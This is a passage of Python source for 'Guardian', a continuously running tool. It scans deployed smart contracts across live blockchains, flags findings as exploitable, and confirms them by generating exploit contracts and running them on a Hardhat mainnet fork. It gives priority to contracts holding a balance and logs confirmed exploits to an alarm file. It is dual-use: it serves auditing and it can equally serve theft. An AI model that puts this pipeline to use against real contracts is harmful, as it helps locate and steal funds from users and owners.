        contracts_dir = os.path.join(self.exploit_dir, "contracts")
        scripts_dir = os.path.join(self.exploit_dir, "scripts")
        os.makedirs(contracts_dir, exist_ok=True)
        os.makedirs(scripts_dir, exist_ok=True)

        test_file = os.path.join(scripts_dir, "guardian_combined_test.js")

        try:
            # 1. Generate ALL exploit .sol files (one per finding, named differently)
            #    Each gets a unique index to prevent contract name collisions at compile time
            exploit_contracts: list[tuple[str, str, str]] = []  # (finding_name, contract_name, sol_code)
            for idx, finding in enumerate(findings):
                sol_code = self._generate_exploit_contract(
                    contract_addr, finding["finding_name"], finding["finding_name"], index=idx
                )
                name_match = re.search(r"contract\s+(\w+)", sol_code)
                contract_name = name_match.group(1) if name_match else "Exploit"
                exploit_contracts.append((finding["finding_name"], contract_name, sol_code))

            # Write each .sol file with unique name
            sol_files = []
            for fn, cname, sol in exploit_contracts:
                sol_path = os.path.join(contracts_dir, f"{cname}.sol")
                sol_files.append(sol_path)
                with open(sol_path, "w") as f:
                    f.write(sol)

            # 2. Compile ONCE (Hardhat compiles all .sol in contracts/)
            logger.info(f"[HARDHAT] Compiling {len(exploit_contracts)} exploit(s) for {contract_addr[:14]}..")
            compile_proc = await asyncio.create_subprocess_exec(
                _NPX, "hardhat", "compile",
                cwd=self.exploit_dir,
                stdout=asyncio.subprocess.DEVNULL,
                stderr=asyncio.subprocess.PIPE,
                creationflags=_CREATION_FLAGS,
            )
            _, stderr = await asyncio.wait_for(compile_proc.communicate(), timeout=60)
            if compile_proc.returncode != 0:
                err = stderr.decode("utf-8", errors="replace")[:500] if stderr else "compilation failed"
                results = []
                for finding in findings:
                    self.db.update_hardhat_result(
                        contract_addr, chain_id, finding["finding_name"],
                        "FAILED", f"Compilation error: {err}"
                    )
                    results.append({
                        "contract": contract_addr, "finding": finding["finding_name"],
                        "result": "FAILED", "evidence": err[:200]
                    })
                return results

            # 3. Generate and run combined JS script
            findings_contracts = [(fn, cn) for fn, cn, _ in exploit_contracts]
            combined_js = self._generate_combined_script(
                contract_addr, rpc_url, findings_contracts
            )
            with open(test_file, "w") as f:
                f.write(combined_js)

            logger.info(f"[HARDHAT] Testing {len(findings)} finding(s) on {contract_addr[:14]}.. (single fork)")
            test_proc = await asyncio.create_subprocess_exec(
                _NPX, "hardhat", "run", "scripts/guardian_combined_test.js",
                cwd=self.exploit_dir,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT,
                creationflags=_CREATION_FLAGS,
            )
            stdout, _ = await asyncio.wait_for(test_proc.communicate(), timeout=180)
            output = stdout.decode("utf-8", errors="replace")

            # 4. Parse per-finding results from indexed FINDING_RESULT:N| lines
            results = []
            result_by_idx = {}  # index -> (result, evidence)
            for line in output.split("\n"):
                if line.startswith("FINDING_RESULT:"):
                    # Format: FINDING_RESULT:N|name|result|evidence
                    rest = line[len("FINDING_RESULT:"):]
                    parts = rest.split("|", 3)
                    if len(parts) == 4:
                        idx = parts[0].strip()
                        fn_result = parts[2].strip()
                        fn_evidence = parts[3].strip()[:2000]
                        if idx.isdigit():
                            result_by_idx[int(idx)] = (fn_result, fn_evidence)

            for idx, finding in enumerate(findings):
                fn_name = finding["finding_name"]
                finding_id = finding.get("id")
                if idx in result_by_idx:
                    fn_result, fn_evidence = result_by_idx[idx]
                else:
                    fn_result = "FAILED"
                    fn_evidence = f"No FINDING_RESULT for idx {idx} in output"

                if finding_id:
                    self.db.update_hardhat_result_by_id(
                        finding_id, contract_addr, chain_id, fn_result, fn_evidence
                    )
                else:
                    self.db.update_hardhat_result(
                        contract_addr, chain_id, fn_name, fn_result, fn_evidence
                    )
                results.append({
                    "contract": contract_addr,
                    "finding": fn_name,
                    "result": fn_result,
                    "evidence": fn_evidence[:200],
                })

                if fn_result == "CONFIRMED":
                    logger.critical(f"[!!!] EXPLOIT CONFIRMED on {contract_addr[:14]}.. via {fn_name}!")

            return results

        except asyncio.TimeoutError:
            evidence = "Hardhat combined test timed out after 180s"
            results = []
            for finding in findings:
                self.db.update_hardhat_result(
                    contract_addr, chain_id, finding["finding_name"], "FAILED", evidence
                )
                results.append({
                    "contract": contract_addr, "finding": finding["finding_name"],
                    "result": "FAILED", "evidence": evidence[:200]
                })
            return results
        except Exception as e:
            error_msg = f"Hardhat combined validation error: {e}"
            logger.error(f"[HARDHAT] {error_msg}")
            results = []
            for finding in findings:
                self.db.update_hardhat_result(
                    contract_addr, chain_id, finding["finding_name"], "FAILED", error_msg
                )
                results.append({
                    "contract": contract_addr, "finding": finding["finding_name"],
                    "result": "FAILED", "evidence": error_msg[:200]
                })
            return results
        finally:
            # Cleanup generated files
            for fp in [test_file] + sol_files:
                try:
                    if os.path.exists(fp):
                        os.remove(fp)
                except Exception:
                    pass

    async def validate_all_pending(self) -> list[dict]:
        """Validate all pending exploitable findings in the DB.

        Groups findings by contract for batch validation (1 fork per contract).
        """
        pending = self.db.get_exploitable_not_tested()
        # Group by (contract_addr, chain_id)
        groups: dict[tuple[str, int], list[dict]] = {}
        for f in pending:
            key = (f["contract_addr"], f["chain_id"])
            groups.setdefault(key, []).append(f)

        all_results = []
        for (addr, cid), contract_findings in groups.items():
            results = await self.validate_contract(contract_findings)
            all_results.extend(results)
        return all_results

    async def validate_for_addresses(self, addresses: list[tuple[str, int]]) -> list[dict]:
        """Validate exploitable findings only for specific (address, chain_id) pairs.

        Groups findings by contract for batch validation (1 fork per contract).

        Args:
            addresses: List of (contract_address, chain_id) tuples to validate.

        Returns:
            List of result dicts with contract, finding, result, evidence.
        """
        pending = self.db.get_exploitable_not_tested_for_addresses(addresses)
        # Group by (contract_addr, chain_id)
        groups: dict[tuple[str, int], list[dict]] = {}
        for f in pending:
            key = (f["contract_addr"], f["chain_id"])
            groups.setdefault(key, []).append(f)

        all_results = []
        for (addr, cid), contract_findings in groups.items():
            results = await self.validate_contract(contract_findings)
            all_results.extend(results)
        return all_results

# ---------------------------------------------------------------------------
# Guardian — Main Engine (clean callback architecture)
# ---------------------------------------------------------------------------

class Guardian:
    """The main guardian engine — runs continuously on all chains.

    Architecture:
      - Creates ScannerOrchestrator with:
          * on_contract_checked callback for DB persistence
          * stop_on="none" (never stops on vulnerability)
      - Handles all DB persistence internally
      - Validates exploitable findings via HardhatValidator
    """

    def __init__(self, config_path: str = "config.yaml", force_hardhat: bool = False):
        self.config_path = config_path
        self.config = self._load_config()
        self.db = FindingsDB()

        # Build RPC URLs from config.yaml (includes Infura secret) for Hardhat fork
        rpc_urls: dict[int, str] = {}
        for chain_key, chain_cfg in self.config.get("chains", {}).items():
            cid = chain_cfg.get("chain_id")
            rpc = chain_cfg.get("rpc_http", "")
            if cid and rpc:
                rpc_urls[cid] = rpc
        self.hardhat = HardhatValidator(self.db, rpc_urls=rpc_urls or None)
        self.orchestrator: Optional[ScannerOrchestrator] = None
        self.running = False
        self.stop_event = asyncio.Event()
        self._exploit_pipeline: Optional[ExploitPipeline] = None
        self.force_hardhat = force_hardhat
        self._hardhat_task: Optional[asyncio.Task] = None

        # Stats (cumulative across runs)
        self.stats = {
            "started_at": None,
            "contracts_checked": 0,
            "vulns_found": 0,
            "exploits_confirmed": 0,
            "chains_active": 0,
        }

    def _load_config(self) -> dict:
        if not os.path.exists(self.config_path):
            logger.error(f"Config not found: {self.config_path}")
            sys.exit(1)
        with open(self.config_path, "r", encoding="utf-8") as f:
            return yaml.safe_load(f) or {}

    async def run_backfill(self, force: bool = False, limit: int = 0, hardhat: bool = False, feedback_interval: int = 5):
        """Backfill: run exploit pipeline on all verified contracts in the DB.

        Reads contracts from the database, fetches their source code,
        runs the full exploit pipeline, and stores findings.
        Useful when new patterns are added (e.g., Mythril patterns).

        Args:
            force: If True, re-process ALL contracts (delete + re-create findings).
            limit: Max contracts to process (0 = no limit).
            hardhat: If True, run Hardhat fork tests on exploitable findings after backfill.
            feedback_interval: Print progress summary every N contracts (0 = no feedback).
        """
        logger.info("=" * 60)
        logger.info("  GUARDIAN — BACKFILL: Reprise de tous les contrats verifies")
        logger.info("=" * 60)

        self.db.connect()
        contracts = self.db.get_verified_contracts(force=force)

        if not contracts:
            logger.info("[BACKFILL] Aucun contrat a traiter (deja tous a jour ?)")
            return

        if limit > 0:
            contracts = contracts[:limit]

        total = len(contracts)
        logger.info(f"[BACKFILL] {total} contrat(s) a traiter")
        if force:
            logger.info("[BACKFILL] Mode FORCE: re-scan de tous les contrats (findings existants effaces)")
        if feedback_interval > 0:
            logger.info(f"[BACKFILL] Feedback progressif tous les {feedback_interval} contrats")

        # Initialize exploit pipeline
        api_key = self.config.get("global", {}).get("explorer_api_key", "")
        pipeline = ExploitPipeline(api_key=api_key)

        processed = 0
        errors = 0
        skipped = 0
        total_findings = 0
        total_exploitables = 0
        processed_addresses: list[tuple[str, int]] = []  # (address, chain_id) for Hardhat scope
        start_time = datetime.utcnow()

        for idx, contract in enumerate(contracts, 1):
            addr = contract["address"]
            chain_id = contract["chain_id"]
            chain_name = contract.get("chain_name", f"chain-{chain_id}")
            bal = contract.get("bnb_balance", 0)

            logger.info(f"[{idx}/{total}] {addr[:14]}.. sur {chain_name} (bal={bal:.4f})")

            # If force mode, delete old findings first
            if force:
                self.db.delete_findings(addr, chain_id)

            # Skip if already scanned (and not force)
            if not force and self.db.is_scanned(addr, chain_id):
                logger.info(f"  -> Deja dans la DB, skip")
                continue

            try:
                # Run the exploit pipeline (fetches source via API)
                report = await pipeline.run_for_address(addr, chain_id, chain_name)

                if not report or not report.findings:
                    # Still record the contract as scanned (0 findings)
                    contract_rec = ContractRecord(
                        address=addr, chain_id=chain_id, chain_name=chain_name,
                        name=report.contract_name if report else contract.get("name", "Unknown"),
                        verified=True,
                        source_length=report.source_length if report else 0,
                        sol_version=report.solidity_version if report else None,
                        scanned_at=datetime.utcnow().isoformat(),
                        finding_count=0,
                        bnb_balance=bal,
                    )
                    self.db.upsert_contract(contract_rec)
                    logger.info(f"  -> 0 finding(s)")
                    processed += 1
                    processed_addresses.append((addr, chain_id))
                    continue

                # Store contract
                contract_rec = ContractRecord(
                    address=addr, chain_id=chain_id, chain_name=chain_name,
                    name=report.contract_name,
                    verified=True,
                    source_length=report.source_length,
                    sol_version=report.solidity_version,
                    scanned_at=datetime.utcnow().isoformat(),
                    finding_count=len(report.findings),
                    exploitable_count=report.total_exploitable,
                    bnb_balance=bal,
                )
                self.db.upsert_contract(contract_rec)

                # Store findings
                for finding, validation in zip(report.findings, report.validations):
                    finding_rec = FindingRecord(
                        contract_addr=addr, chain_id=chain_id,
                        finding_name=finding.name, severity=finding.severity,
                        line_numbers=finding.line_numbers,
                        exploitable=validation.theoretically_exploitable,
                        exploit_notes=validation.exploit_notes,
                        created_at=datetime.utcnow().isoformat(),
                    )
                    self.db.add_finding(finding_rec)

                findings_count = len(report.findings)
                exploitables_count = report.total_exploitable
                total_findings += findings_count
                total_exploitables += exploitables_count

                logger.info(f"  -> {findings_count} finding(s), {exploitables_count} exploitable(s)")
                if exploitables_count > 0:
                    logger.warning(f"  [!] EXPLOITABLE: {exploitables_count} sur {addr[:14]}..")

                processed += 1
                processed_addresses.append((addr, chain_id))

            except Exception as e:
                logger.error(f"[BACKFILL] Erreur sur {addr[:14]}..: {e}")
                errors += 1

            # Progress feedback every N contracts
            if feedback_interval > 0 and processed > 0 and processed % feedback_interval == 0:
                elapsed = (datetime.utcnow() - start_time).total_seconds()
                rate = processed / elapsed if elapsed > 0 else 0
                eta_secs = (total - idx) / rate if rate > 0 else 0
                logger.info(
                    f"[PROGRESS] {processed}/{total} traites | "
                    f"{total_findings} findings | {total_exploitables} exploitables | "
                    f"{errors} erreurs | {elapsed:.0f}s ecoulees | "
                    f"ETA: {eta_secs:.0f}s"
                )

        await pipeline.close()

        # Optionally run Hardhat fork validation (SCOPED to contracts just processed)
        if hardhat:
            pending = self.db.get_exploitable_not_tested_for_addresses(processed_addresses)
            if pending:
                logger.info(f"[BACKFILL-HARDHAT] Validation de {len(pending)} finding(s) exploitable(s) sur Hardhat fork...")
                hardhat_results = await self.hardhat.validate_for_addresses(processed_addresses)
                confirmed = [r for r in hardhat_results if r["result"] == "CONFIRMED"]
                for r in confirmed:
                    self.stats["exploits_confirmed"] += 1
                    logger.critical(f"[!!!] EXPLOIT CONFIRMED on {r['contract'][:14]}.. via {r['finding']}!")
                    self.db.log_event("EXPLOIT", "backfill",
                        f"CONFIRMED on {r['contract']} via {r['finding']}")
                if confirmed:
                    alarm_path = os.path.join(
                        os.path.dirname(os.path.abspath(__file__)),
                        "guardian_exploits_found.txt"
                    )
                    with open(alarm_path, "a") as f:
                        f.write(f"\n{'='*60}")
                        f.write(f"\n[BACKFILL] EXPLOITS CONFIRMED at {datetime.utcnow().isoformat()}")
                        for r in confirmed:
                            f.write(f"\n  - {r['contract']} via {r['finding']}: {r['evidence'][:200]}")
                        f.write(f"\n{'='*60}\n")
                logger.info(f"[BACKFILL-HARDHAT] Hardhat termine: {len(confirmed)} confirme(s) / {len(hardhat_results)} test(s)")
            else:
                logger.info("[BACKFILL-HARDHAT] Aucun finding exploitable a valider sur les contrats du backfill")

        logger.info("=" * 60)
        logger.info(f"  BACKFILL TERMINE: {processed} traites, {errors} erreurs")
        if hardhat:
            logger.info("  Hardhat execute")
        logger.info("=" * 60)

    async def _on_unverified_contract(
        self, address: str, chain_id: int, chain_name: str
    ) -> None:
        """Called when a non-verified contract is detected by the orchestrator."""
        addr = address.lower()
        if self.db.is_scanned(addr, chain_id):
            return
        contract = ContractRecord(
            address=addr, chain_id=chain_id, chain_name=chain_name,
            verified=False, scanned_at=datetime.utcnow().isoformat(),
        )
        self.db.upsert_contract(contract)
        self.stats["contracts_checked"] += 1
        logger.info(f"[DETECT] Non-verified: {addr[:14]}.. on {chain_name}")

    async def _on_contract_checked(
        self,
        address: str,
        chain_id: int,
        chain_name: str,
        findings: list[VulnerabilityFinding],
        source_code: str,
    ) -> None:
        """Callback invoked by orchestrator when a verified contract is scanned.

        This is the CLEAN integration point — no hacky queue manipulation needed.
        """
        addr = address.lower()

        # Skip if already in DB (orchestrator caches scans, but we double-check)
        if self.db.is_scanned(addr, chain_id):
            return

        logger.info(f"[GUARDIAN] Processing {addr[:14]}.. ({len(findings)} findings)")

        # Run exploit pipeline using ALREADY FETCHED source (no duplicate Etherscan API call)
        try:
            if not self._exploit_pipeline:
                api_key = self.config.get("global", {}).get("explorer_api_key", "")
                self._exploit_pipeline = ExploitPipeline(api_key=api_key)

            # Use cached source from orchestrator — avoids re-fetching from Etherscan
            report = await self._exploit_pipeline.run_for_address(
                addr, chain_id, chain_name, cached_source=source_code
            )
        except Exception as e:
            logger.error(f"[GUARDIAN] Pipeline error for {addr[:14]}..: {e}")
            report = None

        # Build contract record
        contract = ContractRecord(
            address=addr,
            chain_id=chain_id,
            chain_name=chain_name,
            name=report.contract_name if report else "Unknown",
            verified=True,
            source_length=len(source_code),
            sol_version=report.solidity_version if report else None,
            scanned_at=datetime.utcnow().isoformat(),
            finding_count=len(findings),
        )

        # Get native balance (using CHAIN_REGISTRY from exploit_pipeline)
        try:
            import httpx
            chain_info = CHAIN_REGISTRY.get(chain_id)
            rpc = chain_info[2] if chain_info else None
            if rpc:
                async with httpx.AsyncClient(timeout=10) as c:
                    r = await c.post(rpc, json={
                        "jsonrpc": "2.0", "method": "eth_getBalance",
                        "params": [addr, "latest"], "id": 1
                    })
                    bal = int(r.json().get("result", "0"), 16) / 1e18
                    contract.bnb_balance = bal
        except Exception:
            pass

        self.db.upsert_contract(contract)
        self.stats["contracts_checked"] += 1

        # Store findings from the pipeline (more detailed than orchestrator's)
        if report and report.findings:
            found_exploitable = False
            for finding, validation in zip(report.findings, report.validations):
                finding_record = FindingRecord(
                    contract_addr=addr, chain_id=chain_id,
                    finding_name=finding.name, severity=finding.severity,
                    line_numbers=finding.line_numbers,
                    exploitable=validation.theoretically_exploitable,
                    exploit_notes=validation.exploit_notes,
                    created_at=datetime.utcnow().isoformat(),
                )
                self.db.add_finding(finding_record)

                if validation.theoretically_exploitable:
                    found_exploitable = True
                    contract.exploitable_count += 1
                    self.stats["vulns_found"] += 1
                    logger.warning(
                        f"[VULN] {finding.severity}: {finding.name} "
                        f"sur {addr[:14]}.. — EXPLOITABLE! (bal: {contract.bnb_balance:.4f})"
                    )

            # Update contract with exploitable count
            if found_exploitable:
                self.db.upsert_contract(contract)

            # Auto-validate on Hardhat if exploitable (in force mode, skip balance check)
            if found_exploitable and (self.force_hardhat or contract.bnb_balance > 0.001):
                bal_info = f"bal={contract.bnb_balance:.4f}" if contract.bnb_balance > 0 else "bal=0 (forced)"
                logger.info(f"[HARDHAT] Auto-validating ({bal_info})...")
                results = await self.hardhat.validate_all_pending()
                for r in results:
                    if r["result"] == "CONFIRMED":
                        self.stats["exploits_confirmed"] += 1
                        self.db.log_event("EXPLOIT", chain_name,
                            f"CONFIRMED on {r['contract']} via {r['finding']}: {r['evidence'][:200]}")
                        logger.critical(
                            f"[!!!] EXPLOIT CONFIRMED on {r['contract'][:14]}.. "
                            f"via {r['finding']}! Evidence: {r['evidence'][:200]}"
                        )
                        # Write to alarm file
                        alarm_path = os.path.join(
                            os.path.dirname(os.path.abspath(__file__)),
                            "guardian_exploits_found.txt"
                        )
                        with open(alarm_path, "a") as f:
                            f.write(f"\n{'='*60}")
                            f.write(f"\n[!!!] EXPLOIT CONFIRMED at {datetime.utcnow().isoformat()}")
                            f.write(f"\nContract: {r['contract']}")
                            f.write(f"\nChain: {chain_name} ({chain_id})")
                            f.write(f"\nFinding: {r['finding']}")
                            f.write(f"\nBalance: {contract.bnb_balance:.4f}")
                            f.write(f"\nEvidence: {r['evidence']}")
                            f.write(f"\n{'='*60}\n")
            elif found_exploitable:
                logger.info(f"[HARDHAT] Skipping: balance={contract.bnb_balance:.4f} (< 0.001, use --force-hardhat to override)")

    async def start(self, target_chains: list[str] | None = None, force_hardhat: bool = False):
        """Start the guardian — runs forever until interrupted.
        
        Args:
            target_chains: Optional list of chain keys to scan (e.g. ['bsc']).
                           If None, all enabled chains in config are used.
            force_hardhat: If True, validates ALL exploitable findings regardless of balance.
        """
        self.force_hardhat = force_hardhat
        logger.info("=" * 60)
        logger.info("  GUARDIAN — Usine de detection automatisee 24/7")
        logger.info("=" * 60)
        logger.info(f"  Base de donnees: {self.db.db_path}")
        logger.info(f"  Demarrage: {datetime.utcnow().isoformat()}")
        if target_chains:
            logger.info(f"  Chaines ciblees: {', '.join(target_chains)}")
        if force_hardhat:
            logger.info("  [FORCE] Hardhat force mode: testing ALL exploitable findings (balance=0 included)")
        logger.info("=" * 60)

        self.stats["started_at"] = datetime.utcnow().isoformat()
        self.running = True

        # Connect to DB
        self.db.connect()
        self.db.log_event("START", "all", "Guardian started")

        # Enable only targeted chains (or all if not specified)
        for chain_key in self.config.get("chains", {}):
            if target_chains:
                self.config["chains"][chain_key]["enabled"] = (chain_key in target_chains)
            else:
                self.config["chains"][chain_key]["enabled"] = True

        # Create orchestrator with clean callbacks (NO auto-stop, NO hacky overrides)
        self.orchestrator = ScannerOrchestrator(
            config=self.config,
            on_contract_checked=self._on_contract_checked,
            on_unverified_contract=self._on_unverified_contract,
            stop_on="none",
        )

        # Start orchestrator (creates single _process_events task — NO DUAL READ)
        await self.orchestrator.start()

        # Set up signal handlers
        try:
            loop = asyncio.get_running_loop()
            for sig in (signal.SIGINT, signal.SIGTERM):
                loop.add_signal_handler(sig, lambda: asyncio.create_task(self.stop()))
        except (NotImplementedError, AttributeError):
            pass

        # Periodic stats display
        async def show_stats():
            while self.running:
                await asyncio.sleep(60)
                stats = self.db.get_stats()
                logger.info(
                    f"[STATS] Contracts: {stats['contracts_total']} | "
                    f"Vérifiés: {stats['contracts_verified']} | "
                    f"Findings: {stats['findings_total']} | "
                    f"Exploitables: {stats['findings_exploitable']} | "
                    f"Hardhat tests: {stats['exploits_confirmed'] + stats['exploits_failed']} | "
                    f"Confirmés: {stats['exploits_confirmed']}"
                )

        stats_task = asyncio.create_task(show_stats())

        # Periodic Hardhat validation (tests existing contracts in DB every 2 min)
        async def hardhat_loop():
            while self.running:
                await asyncio.sleep(120)
                pending = self.db.get_exploitable_not_tested()
                if pending:
                    logger.info(f"[HARDHAT] Periodic: {len(pending)} findings pending, starting validation...")
                    try:
                        results = await self.hardhat.validate_all_pending()
                        for r in results:
                            if r["result"] == "CONFIRMED":
                                self.stats["exploits_confirmed"] += 1
                                logger.critical(f"[!!!] EXPLOIT CONFIRMED on {r['contract'][:14]}.. via {r['finding']}!")
                    except Exception as e:
                        logger.error(f"[HARDHAT] Periodic validation error: {e}")

        self._hardhat_task = asyncio.create_task(hardhat_loop())

        try:
            # Wait FOREVER — no stop on vulnerability!
            logger.info("[GUARDIAN] Running. Press Ctrl+C to stop.")
            await self.stop_event.wait()
        except KeyboardInterrupt:
            logger.info("Keyboard interrupt received...")
        finally:
            stats_task.cancel()
            if self._hardhat_task:
                self._hardhat_task.cancel()
            await self.stop()

    async def stop(self):
        """Graceful shutdown."""
        logger.info("Shutting down Guardian...")
        self.running = False
        self.stop_event.set()

        if self._hardhat_task:
            self._hardhat_task.cancel()
        if self.orchestrator:
            await self.orchestrator.stop()
        if self._exploit_pipeline:
            await self._exploit_pipeline.close()

        self.db.log_event("STOP", "all", "Guardian stopped")

        # Print final stats
        stats = self.db.get_stats()
        logger.info("=" * 60)
        logger.info("  GUARDIAN — RAPPORT FINAL")
        logger.info("=" * 60)
        logger.info(f"  Contrats scannes: {stats['contracts_total']}")
        logger.info(f"  Verifies: {stats['contracts_verified']}")
        logger.info(f"  Findings totaux: {stats['findings_total']}")
        logger.info(f"  Exploitables: {stats['findings_exploitable']}")
        logger.info(f"  Tests Hardhat: {stats['exploits_confirmed'] + stats['exploits_failed']}")
        logger.info(f"  Confirmes: {stats['exploits_confirmed']}")
        logger.info(f"  Echoues: {stats['exploits_failed']}")
        logger.info(f"  En attente: {stats['exploits_pending']}")
        logger.info("=" * 60)

        if stats['exploits_confirmed'] > 0:
            logger.critical(f"[!!!] {stats['exploits_confirmed']} EXPLOIT(S) CONFIRME(S) !")
            alarm_path = os.path.join(
                os.path.dirname(os.path.abspath(__file__)),
                "guardian_exploits_found.txt"
            )
            if os.path.exists(alarm_path):
                with open(alarm_path, "r") as f:
                    print(f.read())

        self.db.close()
        logger.info("[DONE] Guardian stopped. Goodbye!")

    def print_status(self):
        """Print current status from database."""
        if not os.path.exists(self.db.db_path):
            print("[GUARDIAN] Database not found. Start guardian first.")
            return

        self.db.connect()
        stats = self.db.get_stats()
        print(f"\n{'='*60}")
        print(f"  GUARDIAN — STATUS")
        print(f"{'='*60}")
        print(f"  Contrats dans la base: {stats['contracts_total']}")
        print(f"  Contrats verifies: {stats['contracts_verified']}")
        print(f"  Findings: {stats['findings_total']}")
        print(f"  Exploitables: {stats['findings_exploitable']}")
        print(f"  Testes Hardhat: {stats['exploits_confirmed'] + stats['exploits_failed']}")
        print(f"  Confirmes: {stats['exploits_confirmed']}")
        print(f"  Echoues: {stats['exploits_failed']}")
        print(f"  En attente: {stats['exploits_pending']}")
        print(f"{'='*60}\n")

        pending = self.db.get_exploitable_not_tested()
        if pending:
            print(f"  Findings exploitables en attente de test Hardhat ({len(pending)}):")
            for f in pending[:10]:
                print(f"    [{f['severity']}] {f['finding_name'][:50]:50s} "
                     f"sur {f['contract_addr'][:14]}..")
            if len(pending) > 10:
                print(f"    ... et {len(pending) - 10} autre(s)")
            print()
        self.db.close()

    def print_report(self):
        """Export a full report."""
        self.print_status()

    @staticmethod
    def check_health():
        """Health check for 24/7 monitoring.

        Checks:
        - PID file exists and process is alive
        - Database exists and has recent activity
        - Log file has recent writes

        Returns exit code 0 if healthy, 1 otherwise.
        """
        base_dir = os.path.dirname(os.path.abspath(__file__))
        pid_file = os.path.join(base_dir, "guardian.pid")
        db_file = os.path.join(base_dir, "guardian_data.db")
        log_file = os.path.join(base_dir, "guardian_output.log")

        issues = []
        healthy = True

        print(f"\n{'='*60}")
        print("  GUARDIAN — HEALTH CHECK")
        print(f"{'='*60}")

        # 1. Check PID file and process
        print("\n  [1/3] Process...")
        if os.path.exists(pid_file):
            with open(pid_file) as f:
                pid = f.read().strip()
            if pid and pid.isdigit():
                pid_int = int(pid)
                alive = False
                try:
                    if sys.platform == "win32":
                        r = subprocess.run(["tasklist", "/FI", f"PID eq {pid_int}"],
                                          capture_output=True, text=True, timeout=5,
                                          creationflags=_CREATION_FLAGS)
                        alive = "python" in r.stdout.lower()
                    else:
                        # Unix/macOS: kill with signal 0 checks if process exists
                        os.kill(pid_int, 0)
                        alive = True
                except (OSError, subprocess.TimeoutExpired):
                    alive = False
                if alive:
                    print(f"     [OK] PID {pid_int} - actif")
                else:
                    print(f"     [DEAD] PID {pid_int} - introuvable")
                    issues.append("Process mort")
                    healthy = False
            else:
                print(f"     [FAIL] PID invalide: {pid}")
                issues.append("PID invalide")
                healthy = False
        else:
            print("     [WARN] Aucun PID (pas de processus enregistre)")
            issues.append("Pas de PID")

        # 2. Check database
        print("\n  [2/3] Base de donnees...")
        if os.path.exists(db_file):
            size_kb = os.path.getsize(db_file) / 1024
            mtime = datetime.fromtimestamp(os.path.getmtime(db_file))
            age_mins = (datetime.now() - mtime).total_seconds() / 60
            print(f"     [OK] DB: {size_kb:.0f} KB, derniere modif: {mtime:%H:%M:%S} ({age_mins:.0f} min)")
            if age_mins > 5:
                print(f"     [WARN] DB pas modifiee depuis {age_mins:.0f} min")
            if age_mins > 15:
                issues.append(f"DB inactive ({age_mins:.0f} min)")
                healthy = False
            # Check for recent entries
            try:
                conn = sqlite3.connect(db_file)
                cur = conn.execute("SELECT MAX(timestamp) FROM scan_log")
                last_log = cur.fetchone()[0]
                if last_log:
                    last_time = datetime.fromisoformat(last_log)
                    log_age = (datetime.utcnow() - last_time).total_seconds() / 60
                    cnt = conn.execute("SELECT COUNT(*) FROM contracts").fetchone()[0]
                    print(f"     [OK] {cnt} contrats, dernier log: {last_time:%H:%M:%S} ({log_age:.0f} min)")
                conn.close()
            except Exception as e:
                print(f"     [WARN] Erreur lecture DB: {e}")
        else:
            print(f"     [WARN] DB introuvable")
            issues.append("DB absente")

        # 3. Check log file
        print("\n  [3/3] Logs...")
        if os.path.exists(log_file):
            mtime = datetime.fromtimestamp(os.path.getmtime(log_file))
            age_mins = (datetime.now() - mtime).total_seconds() / 60
            size_kb = os.path.getsize(log_file) / 1024
            print(f"     [OK] Log: {size_kb:.0f} KB, derniere ecriture: {mtime:%H:%M:%S} ({age_mins:.0f} min)")
            if age_mins > 5:
                print(f"     [WARN] Pas d'ecriture depuis {age_mins:.0f} min")
                if age_mins > 15:
                    issues.append(f"Log inactif ({age_mins:.0f} min)")
                    healthy = False
        else:
            print("     [WARN] Log introuvable")

        print(f"\n{'='*60}")
        if healthy:
            print("  [OK] GUARDIAN: HEALTHY")
        else:
            print(f"  [FAIL] GUARDIAN: ISSUES ({len(issues)})")
            for i, issue in enumerate(issues, 1):
                print(f"     {i}. {issue}")
        print(f"{'='*60}\n")

        return 0 if healthy else 1


# ---------------------------------------------------------------------------
# CLI Entry Point
# ---------------------------------------------------------------------------

async def main_async(args):
    if args.health:
        sys.exit(Guardian.check_health())

    force_hardhat = getattr(args, "force_hardhat", False)
    guardian = Guardian(config_path=args.config, force_hardhat=force_hardhat)

    if args.status:
        guardian.print_status()
        return
    if args.report:
        guardian.print_report()
        return

    # Backfill mode: process all contracts from DB without live scanning
    if args.backfill:
        backfill_limit = getattr(args, "backfill_limit", 0) or 0
        backfill_hardhat = getattr(args, "backfill_hardhat", False)
        feedback = getattr(args, "backfill_feedback", 0) or 0
        await guardian.run_backfill(force=args.force, limit=backfill_limit, hardhat=backfill_hardhat, feedback_interval=feedback)
        return

    # Parse target chains if specified
    target_chains = None
    if args.chains:
        target_chains = [c.strip().lower() for c in args.chains.split(",") if c.strip()]

    try:
        await guardian.start(target_chains=target_chains, force_hardhat=force_hardhat)
    except KeyboardInterrupt:
        await guardian.stop()


def main():
    import argparse
    parser = argparse.ArgumentParser(
        description="Guardian — Usine de detection automatisee 24/7"
    )
    parser.add_argument("--config", "-c", default="config.yaml", help="Config file")
    parser.add_argument("--status", action="store_true", help="Show database status")
    parser.add_argument("--report", action="store_true", help="Export report")
    parser.add_argument("--health", action="store_true",
                        help="Health check (process, DB, logs)")
    parser.add_argument("--chains", default=None,
                        help="Comma-separated list of chains to scan (default: all enabled in config)")
    parser.add_argument("--force-hardhat", action="store_true",
                        help="Force Hardhat validation on ALL exploitable findings (balance=0 included)")
    parser.add_argument("--backfill", action="store_true",
                        help="Run exploit pipeline on all verified contracts in DB (no live scanning)")
    parser.add_argument("--backfill-limit", type=int, default=0,
                        help="Max contracts to process in backfill mode (0 = unlimited)")
    parser.add_argument("--force", action="store_true",
                        help="Force re-scan in backfill mode (delete and re-create findings)")
    parser.add_argument("--backfill-hardhat", action="store_true",
                        help="After backfill, run Hardhat fork tests on all exploitable findings to confirm them")
    parser.add_argument("--backfill-feedback", type=int, default=5,
                        help="Print progress summary every N contracts during backfill (default: 5, 0 = no feedback)")
    args = parser.parse_args()

    try:
        asyncio.run(main_async(args))
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
